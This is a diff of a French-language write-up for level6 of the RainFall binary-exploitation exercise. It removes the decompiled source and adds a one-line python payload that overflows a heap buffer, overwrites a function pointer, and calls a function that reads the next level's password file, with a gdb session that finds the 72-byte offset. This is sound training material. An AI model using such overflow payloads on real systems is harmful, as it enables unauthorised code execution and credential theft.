@@ -1,32 +1,10 @@
-Code Source :
+# Solution
 
-void n(void)
-{
-  system("/bin/cat /home/user/level7/.pass");
-  return;
-}
+```
+./level6 "$(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')"
+```
 
-void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
-{
-  puts("Nope");
-  return;
-}
-
-
-void main(undefined4 param_1,int param_2)
-{
-  char *dst;
-  code **ppcVar1;
-  
-  dst = (char *)malloc(0x40);
-  ppcVar1 = (code **)malloc(4);
-  *ppcVar1 = m;
-  strcpy(dst,*(char **)(param_2 + 4));
-  (**ppcVar1)();
-  return;
-}
-
-Solution :
+# Explication du level
 
 Dans ce niveau il y a plusieur point que l'on peut remarquer
 
@@ -55,6 +33,7 @@ str : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac
 
 Ensuite on peu sois utiliser peda sois passer par gdb comme nous avons deja utiliser peda, nious allons faire avec gdb cette fois ci :
 
+```
 level6@RainFall:~$ gdb ./level6
 (gdb) b main
 Breakpoint 1 at 0x804847f
@@ -62,26 +41,6 @@ Breakpoint 1 at 0x804847f
 Starting program: /home/user/level6/level6 str : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 Breakpoint 1, 0x0804847f in main ()
-
-##Avant l'overflow : 
-(gdb) info register
-eax            0x4	4
-ecx            0xbffff764	-1073744028
-edx            0xbffff6f4	-1073744140
-ebx            0xb7fd0ff4	-1208152076
-esp            0xbffff6c8	0xbffff6c8
-ebp            0xbffff6c8	0xbffff6c8
-esi            0x0	0
-edi            0x0	0
-eip            0x804847f	0x804847f <main+3>
-eflags         0x200246	[ PF ZF IF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-
 (gdb) n
 Single stepping until exit from function main,
 which has no line number information.
@@ -107,6 +66,7 @@ ds             0x7b	123
 es             0x7b	123
 fs             0x0	0
 gs             0x33	51
+```
 
 Comme $eip est = 41346341 si on converti cela en caractere lisible cela donne A4cA on inverse et cela donne Ac4A qui apparait au 72 char de notre str
 
